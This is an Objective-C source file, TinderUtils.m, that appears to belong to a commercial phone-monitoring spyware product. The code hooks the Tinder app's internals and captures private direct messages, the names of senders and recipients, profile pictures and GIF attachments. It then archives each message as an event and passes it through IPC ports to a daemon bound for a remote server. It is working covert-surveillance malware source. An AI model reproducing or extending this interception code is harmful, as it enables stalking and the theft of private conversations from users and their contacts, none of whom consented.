//
//  TinderUtils.m
//  MSFSP
//
//  Created by Khaneid Hantanasiriskul on 7/22/2559 BE.
//
//

#import "TinderUtils.h"

#import "FxIMEvent.h"
#import "FxEventEnums.h"
#import "FxRecipient.h"
#import "FxAttachment.h"
#import "DateTimeFormat.h"
#import "DaemonPrivateHome.h"

#import "IMShareUtils.h"
#import "StringUtils.h"
#import "DefStd.h"
#import "SharedFile2IPCSender.h"
#import "MessagePortIPCSender.h"

//Tinder Header
#import "TNDRDataInspector.h"
#import "TNDRUser.h"

#import <objc/runtime.h>

static TinderUtils *_TinderUtils = nil;

@implementation TinderUtils

#pragma mark - Shared Instance -

+ (TinderUtils *) sharedTinderUtils {
    if (_TinderUtils == nil) {
        _TinderUtils = [[TinderUtils alloc] init];
        
        SharedFile2IPCSender *sharedFileSender = nil;
        
        sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kTinderMessagePort1];
        [_TinderUtils setMIMSharedFileSender:sharedFileSender];
        [sharedFileSender release];
        sharedFileSender = nil;
        
        NSOperationQueue *sendingEventQueue = [[NSOperationQueue alloc] init];
        sendingEventQueue.maxConcurrentOperationCount = 1;
        [_TinderUtils setMSendingEventQueue:sendingEventQueue];
        [sendingEventQueue release];
        sendingEventQueue = nil;
        
    }
    return (_TinderUtils);
}

#pragma mark - Capture Util -

- (void)captureTinderMessageFromMessageDict:(NSDictionary *)aMessageDict inContext:(NSManagedObjectContext *)aContext
{
    @try {
        DLog(@"Send Tinder message");
        
        NSMutableDictionary *tinderDictionary = [NSMutableDictionary dictionary];
        
        __block FxEventDirection messgageDirection;
        __block FxIMMessageRepresentation messageRepresentation = kIMMessageText;
        NSString *message = nil;
        
        Class $TNDRDataInspector = objc_getClass("TNDRDataInspector");
        TNDRDataInspector *dataInspector = [$TNDRDataInspector di];
     
        NSArray *senderArray = [dataInspector usersWithID:aMessageDict[@"from"] inContext:aContext];
        TNDRUser *sender = [senderArray firstObject];
        DLog(@"sender %@", sender);
        
        if ([sender.isCurrentUser boolValue]) {
            messgageDirection = kEventDirectionOut;
        }
        else {
            messgageDirection = kEventDirectionIn;
        }
        
        NSArray *receiverArray = [dataInspector usersWithID:aMessageDict[@"to"] inContext:aContext];
        TNDRUser *receiver = [receiverArray firstObject];
        DLog(@"receiver %@", receiver);
        
        // -- get UID ------------------------------------------------------------
        NSString *senderUID             = [NSString stringWithString:sender.userID];             // -- Target    - UID
        
        // -- get Display Name  ------------------------------------------------------------
        NSString *senderDisplayName     = [NSString stringWithString:sender.commonName];     // -- Target    - Display Name
        
        // -- get conversation ID  ------------------------------------------------------------
        NSString *converID              = [NSString stringWithString:aMessageDict[@"match_id"]];       // -- Conversation ID
        NSString *converName             = @"";       // -- Conversation Name
        
        if (messgageDirection == kEventDirectionOut) {
            converName = receiver.commonName;
        }
        else {
            converName = sender.commonName;
        }
        
        DLog(@"converName %@", converName)
        
        NSMutableArray *participants    = [NSMutableArray array];
        NSMutableDictionary *participantProfileDictionary = [NSMutableDictionary dictionary];
        
        FxRecipient *participant = [TinderUtils createFxRecipientWithUsername:[NSString stringWithString:receiver.userID]
                                                              displayname:receiver.commonName
                                                            statusMessage: @""
                                                           pictureProfile:nil];
        
        [participants insertObject:participant atIndex:0];
        [participantProfileDictionary setObject:[receiver.smallMainImageURL absoluteString] forKey:receiver.userID];
        
        [tinderDictionary setObject:participantProfileDictionary forKey:@"ParticipantProfileDic"];
        
        //Profile Picture Data
        if ([sender.smallMainImageURL absoluteString].length > 0) {
            [tinderDictionary setObject:[NSString stringWithString:[sender.smallMainImageURL absoluteString]] forKey:@"ProfilePictureURL"];
        }
        
        // -- get Text or Gif ------------------------------------------------------------
        NSString *type = aMessageDict[@"type"];
        if (type.length > 0 && [type isEqualToString:@"gif"]) {
            messageRepresentation = kIMMessageNone;
            NSString *gifURL = aMessageDict[@"message"];
            [tinderDictionary setObject:[gifURL stringByAppendingString:@".gif"] forKey:@"AttachmentURL"];
        }
        else {
            message = aMessageDict[@"message"];
        }
        
        
        // ------------------- FXIMEvent Construction ------------------------
        
        FxIMEvent *imEvent      = [TinderUtils createFXIMEventForMessageDirection: messgageDirection
                                                               representation: messageRepresentation
                                                                      message: message
                                                                       userID: senderUID                 // sender id
                                                              userDisplayName: senderDisplayName         // sender display name
                                                            userStatusMessage: @""       // sender status message
                                                                  userPicture: nil
                                                                     converID: converID
                                                                   converName: converName
                                                                converPicture: nil
                                                                 participants: participants
                                                                  attachments: nil];
        [[TinderUtils sharedTinderUtils] sendTinderEvent:imEvent withTinderDict:tinderDictionary];
    }
    @catch (NSException *exception) {
        DLog(@"Found exception %@", exception);
    }
    @finally {
        ;
    }
}

#pragma mark - Create FXEvent before sending to server

+ (FxIMEvent *) createFXIMEventForMessageDirection: (FxEventDirection) aDirection
                                    representation: (FxIMMessageRepresentation) aRepresentation
                                           message: (NSString *) aMessage
                                            userID: (NSString *) aUserID
                                   userDisplayName: (NSString *) aUserDisplayname
                                 userStatusMessage: (NSString *) aUserStatusMessage
                                       userPicture: (NSData *) aUserPic
                                          converID: (NSString *) aConverID
                                        converName: (NSString *) aConverName
                                     converPicture: (NSData *) aConverPic
                                      participants: (NSArray *) aParticipaints
                                       attachments: (NSArray *) aAttachments {
    FxIMEvent *imEvent	= [[FxIMEvent alloc] init];
    
    [imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
    [imEvent setMIMServiceID:@"td"];
    [imEvent setMServiceID: kIMServiceTinder];
    
    [imEvent setMDirection: aDirection];
    [imEvent setMRepresentationOfMessage: aRepresentation];
    [imEvent setMMessage: aMessage];
    
    // user (sender)
    [imEvent setMUserID: aUserID];
    [imEvent setMUserDisplayName: aUserDisplayname];
    [imEvent setMUserStatusMessage: aUserStatusMessage];
    [imEvent setMUserPicture: aUserPic];// sender image profile
    [imEvent setMUserLocation: nil];
    
    // converstation
    [imEvent setMConversationID:aConverID];
    [imEvent setMConversationName:aConverName];
    [imEvent setMConversationPicture:aConverPic];
    
    // participant
    [imEvent setMParticipants:aParticipaints];
    
    // share location
    [imEvent setMShareLocation:nil];
    
    [imEvent setMAttachments:aAttachments];
    DLog(@"Tinder Message  %@", imEvent);
    
    return [imEvent autorelease];
}

+ (FxRecipient *) createFxRecipientWithUsername: (NSString *) aUserID
                                    displayname: (NSString *) aUserDisplayname
                                  statusMessage: (NSString *) aStatusMessage
                                 pictureProfile: (NSData *) aPictureProfile {
    FxRecipient *participant = [[FxRecipient alloc] init];
    [participant setRecipNumAddr:aUserID];
    [participant setRecipContactName:aUserDisplayname];
    [participant setMStatusMessage:aStatusMessage];
    [participant setMPicture:aPictureProfile];
    return [participant autorelease];
}

#pragma mark - Send event thread method -

- (void) sendTinderEvent: (FxIMEvent *) aIMEvent withTinderDict:(NSDictionary *)aTinderDict;
{
    NSArray *extraArgs  = [[NSArray alloc] initWithObjects:aIMEvent, aTinderDict, nil];
    [NSThread detachNewThreadSelector:@selector(threadSendTinderEvent:) toTarget:self withObject:extraArgs];
    [extraArgs release];
}

- (void) threadSendTinderEvent: (NSArray *) aArgs
{
    NSInvocationOperation *sendingEventoperation = [[NSInvocationOperation alloc] initWithTarget:self selector:@selector(operationSendTinderEvent:) object:aArgs];
    [self.mSendingEventQueue addOperation:sendingEventoperation];
    [sendingEventoperation release];
}

- (void) operationSendTinderEvent: (NSArray *) aArgs {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    @try {
        FxIMEvent *imEvent = [aArgs objectAtIndex:0];
        NSDictionary *tinderDict = [aArgs objectAtIndex:1];
        
        //Download Profile Picture Data
        NSString *profilePictureURL = tinderDict[@"ProfilePictureURL"];
        if (profilePictureURL.length > 0) {
            NSData *profilePictureData = [NSData dataWithContentsOfURL:[NSURL URLWithString:profilePictureURL]];
            [imEvent setMUserPicture:profilePictureData];
            DLog(@"Download Profile Picture Data %@", profilePictureURL);
        }
        
        //Download Participant Profile Picture Data
        NSArray *participantArray = imEvent.mParticipants;
        NSDictionary *profileDic = tinderDict[@"ParticipantProfileDic"];
        [participantArray enumerateObjectsUsingBlock:^(FxRecipient *participant, NSUInteger idx, BOOL * /*_Nonnull*/ stop) {
            
            if ([profileDic objectForKey:participant.recipNumAddr]) {
                NSString *profilePictureURL = [profileDic objectForKey:participant.recipNumAddr];
                
                if (profilePictureURL.length > 0) {
                    DLog(@"Download Participant Profile Picture Data %@", profilePictureURL);
                    NSData *profilePictureData = [NSData dataWithContentsOfURL:[NSURL URLWithString:profilePictureURL]];
                    [participant setMPicture:profilePictureData];
                }
            }
        }];
        
        NSString *attachmentURL = tinderDict[@"AttachmentURL"];
        
        if (attachmentURL.length > 0) {
            FxAttachment *attachment = [[FxAttachment alloc] init];
            NSString *tinderAttachmentPath = nil;
            NSMutableArray *attachmentArray = [NSMutableArray array];
            NSData *mediaData = [NSData dataWithContentsOfURL:[NSURL URLWithString:attachmentURL]];
            //DLog(@"Media URL %@", originalUrl);
            if (mediaData) {
                tinderAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imTinder/"];
                tinderAttachmentPath = [NSString stringWithFormat:@"%@%f_%@", tinderAttachmentPath, [[NSDate date] timeIntervalSince1970], attachmentURL.lastPathComponent];
                
                if (![mediaData writeToFile:tinderAttachmentPath atomically:YES]) {
                    // iOS 9, Sandbox
                    tinderAttachmentPath = [IMShareUtils saveData:mediaData toDocumentSubDirectory:@"/attachments/imTinder/" fileName:[tinderAttachmentPath lastPathComponent]];
                }
            } else {
                tinderAttachmentPath = @"image/jpg";
            }
            
            [attachment setFullPath:tinderAttachmentPath];
            [attachmentArray addObject:attachment];
            [attachment release];
            
            [imEvent setMAttachments:attachmentArray];
        }
        
        if (imEvent) {
            DLog(@"Sending Event %@", imEvent);
            NSString *msg = [StringUtils removePrivateUnicodeSymbols:[imEvent mMessage]];
            DLog(@"Tinder direct message after remove emoji = %@", msg);
            
            if ([msg length] || [[imEvent mAttachments] count]) {
                [imEvent setMMessage:msg];
                
                NSMutableData* data			= [[NSMutableData alloc] init];
                NSKeyedArchiver *archiver	= [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
                [archiver encodeObject:imEvent forKey:kTinderArchived];
                [archiver finishEncoding];
                [archiver release];
                
                // -- first
                BOOL isSendingOK = [self sendDataToPort:data portName:kTinderMessagePort1];
                //DLog (@"Sending to first port %d", isSendingOK);
                
                if (!isSendingOK) {
                    DLog (@"First sending Tinder direct message fail");
                    
                    // -- second
                    isSendingOK = [self sendDataToPort:data portName:kTinderMessagePort2];
                    
                    if (!isSendingOK) {
                        DLog (@"Second sending Tinder direct message also fail");
                        
                        // -- Third port ----------
                        [NSThread sleepForTimeInterval:3];
                        
                        isSendingOK = [self sendDataToPort:data portName:kTinderMessagePort3];
                        if (!isSendingOK) {
                            DLog (@"Third sending Tinder direct message also fail, so delete the attachment");
                            [TinderUtils deleteAttachmentFileAtPathForEvent:[imEvent mAttachments]];
                        }
                    }
                }
                [data release];
            }
        } // aIMEvent
    }
    @catch (NSException *exception){
        DLog(@"Found Exception %@", exception);
    }
    @finally {
        ;
    }
    [pool release];
}

- (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName {
    BOOL successfully = FALSE;
    
    if ([[[UIDevice currentDevice] systemVersion] intValue] <= 6) {
        MessagePortIPCSender *messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
        successfully                            = [messagePortSender writeDataToPort:aData];
        [messagePortSender release];
        messagePortSender = nil;
    } else {
        SharedFile2IPCSender *sharedFileSender  = self.mIMSharedFileSender;
        DLog(@"sharedFileSender %@", sharedFileSender)
        successfully = [sharedFileSender writeDataToSharedFile:aData];
    }
    return (successfully);
}

#pragma mark - General Utils -

+ (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray {
    // delete the attachment files
    if (aAttachmentArray && [aAttachmentArray count] != 0) {
        for (FxAttachment *attachment in aAttachmentArray) {
            NSString *path = [attachment fullPath];
            //DLog (@"deleting Tinder attachment file: %@", path);
            [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
        }
    }
}


#pragma mark - Dealloc -

- (void)dealloc
{
    [self.mIMSharedFileSender release];
    self.mIMSharedFileSender = nil;
    
    [self.mSendingEventQueue release];
    self.mSendingEventQueue = nil;
    
    [super dealloc];
}


@end
